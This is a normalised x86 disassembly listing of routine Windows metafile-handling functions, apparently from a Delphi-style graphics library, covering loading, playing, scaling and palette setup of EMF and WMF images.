call sub_4034bc
mov [ esi + 0x10 ] eax
mov [ esi + 0x1c ] ebx
mov eax ebx
mov dx 0xfffc
call sub_4034bc
mov [ esi + 0x18 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_4034a4
sub_427718
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
xor eax eax
push ebp
push sub_4277a8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
call sub_4032a8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_4034a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_4031f0
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_4034bc
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_4034bc
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4277c8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4278ec
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_408948
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_404598
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4270dc
test eax eax
jne r-xdata
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42788b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_4034bc
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba0c
call sub_403a74
mov eax [ ebx + 0xc ]
call sub_4032a8
mov esi [ ebp - 0x8 ]
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_4034bc
mov [ esi + 0x10 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_4034a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4278f3
lea eax [ ebp - 0x14 ]
call sub_404038
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_4278fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax [ rw-data ]
call sub_427564
mov esi eax
test esi esi
jne r-xdata
mov dl 0x1
mov eax esi
call [ eax + 0x48 ]
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_427973
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_4034bc
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebp - 0x8 ]
mov esi [ eax ]
call [ esi + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
call sub_425830
mov eax [ ebx + 0xc ]
call sub_4032a8
mov esi [ ebp - 0x8 ]
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_4034bc
mov [ esi + 0x10 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_4034a4
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_4279c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi eax
mov edi [ esi + 0xc ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x60 ]
sub_427a34
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
xor edx edx
mov eax esi
call sub_427718
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov edx [ ebx + 0xc ]
mov eax esi
call sub_427718
jmp r-xdata
mov edx ebx
mov eax esi
call sub_418f24
mov edx ebx
mov eax esi
call sub_427718
jmp r-xdata
pop esi
pop ebx
retn
sub_427a90
push ebx
mov ebx eax
cmp [ ebx + 0x12 ] 0x0
je r-xdata
cmp [ ebx + 0x18 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_427ab4
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x22 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_427adc
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_427be3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x44 ]
mov ecx 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
xor ecx ecx
mov cl [ ebp - 0x44 ]
lea edx [ ebp - 0x43 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
lea eax [ ebp - 0x48 ]
lea edx [ ebp - 0x44 ]
call sub_40429c
mov edx [ ebp - 0x48 ]
mov eax [ rw-data ]
call sub_427174
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
call sub_4032a8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_427b65
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_4034a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427bea
lea eax [ ebp - 0x48 ]
call sub_404038
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_4034bc
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_4034bc
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_427b6a
mov eax [ ebp - 0x4 ]
call sub_4032a8
call sub_403a9c
call sub_403af0
mov eax [ ebx + 0xc ]
call sub_4032a8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_4034a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427bea
lea eax [ ebp - 0x48 ]
call sub_404038
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_4034bc
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_4034bc
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_427bf4
push ebx
push esi
push edi
add esp 0xfffffec0
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
je r-xdata
mov [ esp ] 0x0
lea edx [ esp + 0x40 ]
mov eax [ edi ]
call sub_4031f8
lea edx [ esp + 0x40 ]
mov eax esp
mov cl 0x3f
call sub_402bac
jmp r-xdata
add esp 0x140
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor ecx ecx
mov cl [ esp ]
inc ecx
mov edx esp
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
sub_427c50
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0xc ] 0x0
setne bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ebx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
cmp eax [ ebx + 0xc ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
sub_427ccc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_427adc
mov eax [ ebp - 0x8 ]
push eax
push sub_427bf4
push ebp
call sub_427c50
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_427d48
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
call sub_423714
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403298
test bl bl
jle r-xdata
push eax
call DeleteEnhMetaFile
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_427d88
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_426ae8
mov [ esi + 0x2c ] 0x1
mov [ esi + 0x21 ] 0x1
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_427dd0
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_428da8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418ef8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_427e00
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
test esi esi
je r-xdata
mov edi [ eax + 0x14 ]
call sub_428da8
mov edx esi
mov eax ebx
call sub_418f24
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebx + 0x28 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
mov edx [ eax + 0x28 ]
mov [ ebx + 0x28 ] edx
mov al [ eax + 0x2c ]
mov [ ebx + 0x2c ] al
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x28 ]
call sub_428da4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
cmp edi eax
je r-xdata
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
retn
sub_427e94
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
mov esi eax
xor ebp ebp
test esi esi
je r-xdata
mov eax [ esp ]
push esi
push edi
mov esi eax
lea edi [ esp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
dec [ esp + 0xc ]
dec [ esp + 0x10 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
mov eax edi
call sub_425570
push eax
call PlayEnhMetaFile
test esi esi
je r-xdata
push 0xffffffff
push esi
mov eax edi
call sub_425570
push eax
call SelectPalette
mov ebp eax
mov eax edi
call sub_425570
push eax
call RealizePalette
push 0xffffffff
push ebp
mov eax edi
call sub_425570
push eax
call SelectPalette
sub_427f2c
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_4280d4
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x54 ] 0x64
push eax
mov eax [ esp + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
jmp r-xdata
mov eax [ ebx + 0x20 ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_427f90
push ebx
push esi
push edi
add esp 0xfffffbfc
mov ebx eax
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax edi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x14 ]
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov esi eax
test esi esi
je r-xdata
cmp esi 0x100
jle r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x14 ]
call sub_423714
mov [ esp ] 0x300
mov [ esp + 0x2 ] si
lea eax [ esp + 0x4 ]
push eax
push esi
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov eax esp
push eax
call CreatePalette
mov edx [ ebx + 0x28 ]
mov [ edx + 0x14 ] eax
and esi 0xff
sub_42801c
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_4280d4
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x50 ] 0x64
push eax
mov eax [ esp + 0x4c ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
jmp r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_428080
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4285fc
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_41aff8
pop ecx
sub ecx eax
mov edx esi
mov eax ebx
call sub_428238
mov edx esi
mov eax ebx
call sub_428168
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
retn
sub_4280d4
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x28 ]
call sub_428da8
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov esi eax
mov [ ebx + 0x28 ] esi
mov eax esi
call sub_428da4
pop esi
pop ebx
retn
sub_4280fc
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
cmp [ esp ] 0x4
jg r-xdata
mov edx esi
mov eax ebx
call sub_4285fc
test al al
je r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
mov ecx [ esp ]
sub ecx 0x4
mov edx esi
mov eax ebx
call sub_428238
mov edx esi
mov eax ebx
call sub_428168
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edx
pop edi
pop esi
pop ebx
retn
sub_428168
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4280d4
lea edx [ ebp - 0x68 ]
mov ecx 0x64
mov eax edi
call sub_41b224
cmp [ ebp - 0x40 ] 0x464d4520
je r-xdata
mov eax [ ebp - 0x38 ]
call sub_4026cc
mov [ ebp - 0x4 ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_428228
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x68 ]
mov ecx 0x64
call sub_4028c8
mov ecx [ ebp - 0x38 ]
sub ecx 0x64
mov edx [ ebp - 0x4 ]
add edx 0x64
mov eax edi
call sub_41b224
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
call SetEnhMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_425860
mov [ ebx + 0x18 ] 0x0
mov eax [ ebp - 0x48 ]
sub eax [ ebp - 0x50 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ ebx + 0x10 ] eax
mov [ esi + 0x2c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42822f
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_4026ec
retn
call sub_425860
sub_428238
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_4280d4
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x22 ] 0x9ac6cdd7
jne r-xdata
call sub_425860
lea eax [ ebp - 0x22 ]
call sub_4266b0
cmp ax [ ebp - 0xe ]
je r-xdata
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x18 ]
movsx edx [ ebp - 0x1c ]
sub eax edx
push eax
call MulDiv
mov [ ebx + 0xc ] eax
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x16 ]
movsx edx [ ebp - 0x1a ]
sub eax edx
push eax
call MulDiv
mov [ ebx + 0x10 ] eax
mov [ ebp - 0x32 ] 0x8
xor eax eax
mov [ ebp - 0x2e ] eax
xor eax eax
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
mov [ ebp - 0x14 ] 0x60
sub [ ebp - 0x8 ] 0x16
mov eax [ ebp - 0x8 ]
call sub_4026cc
mov [ ebp - 0xc ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_4283a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ esi + 0x28 ]
mov dx [ ebp - 0x14 ]
mov [ eax + 0x18 ] dx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
lea eax [ ebp - 0x96 ]
push eax
push 0x64
mov eax [ ebx + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov [ ebp - 0x32 ] 0x8
mov eax [ ebp - 0x76 ]
mov [ ebp - 0x2e ] eax
mov eax [ ebp - 0x72 ]
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
mov eax [ ebx + 0x8 ]
push eax
call DeleteEnhMetaFile
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_425860
mov [ esi + 0x2c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4283ae
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_4026ec
retn
call sub_425860
sub_4283b8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42845f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x2c ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_42843d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_408948
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_40c6ec
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404444
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_426db4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428444
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x2c ] dl
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c ] 0x0
sub_428498
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_4280d4
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_42850c
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x4c ]
push eax
imul eax [ esp + 0x58 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_42850c
jmp r-xdata
mov [ eax + 0x20 ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_42850c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x20 ] edx
cmp esi [ eax + 0x10 ]
je r-xdata
mov eax ebx
call sub_4280d4
pop esi
pop ebx
retn
mov eax ebx
call sub_42865c
mov eax [ ebx + 0x28 ]
mov [ eax + 0x10 ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_428548
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x1c ] edx
cmp esi [ eax + 0xc ]
je r-xdata
mov eax ebx
call sub_4280d4
pop esi
pop ebx
retn
mov eax ebx
call sub_42865c
mov eax [ ebx + 0x28 ]
mov [ eax + 0xc ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_428588
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_4280d4
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_428548
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x48 ]
push eax
imul eax [ esp + 0x54 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_428548
jmp r-xdata
mov [ eax + 0x1c ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_4285fc
push ebx
push esi
push edi
add esp 0xffffff9c
mov ebx edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_41aff8
sub esi eax
cmp esi 0x64
jle r-xdata
cmp esi 0x64
jle r-xdata
mov edx esp
mov ecx 0x64
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov cx 0x1
mov edx 0xffffff9c
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
xor eax eax
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
add esp 0x64
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x28 ] 0x464d4520
je r-xdata
mov al 0x1
sub_42865c
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
jne r-xdata
cmp [ eax + 0x4 ] 0x1
jle r-xdata
mov eax ebx
call sub_4280d4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov esi eax
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x8 ]
test edi edi
je r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x10 ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ ebx + 0x28 ]
mov ax [ eax + 0x18 ]
mov [ esi + 0x18 ] ax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x1c ]
mov [ esi + 0x1c ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x20 ]
mov [ esi + 0x20 ] eax
mov eax [ ebx + 0x28 ]
call sub_428da8
mov eax esi
mov [ ebx + 0x28 ] eax
call sub_428da4
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
sub_4286e0
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
cmp [ esi + 0x28 ] 0x0
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax ebx
call sub_41aff8
sub eax 0x4
mov [ esp ] eax
cmp [ esi + 0x2c ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_4287ec
mov edx ebx
mov eax esi
call sub_428760
jmp r-xdata
xor ecx ecx
mov edx [ esp ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub eax [ esp ]
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
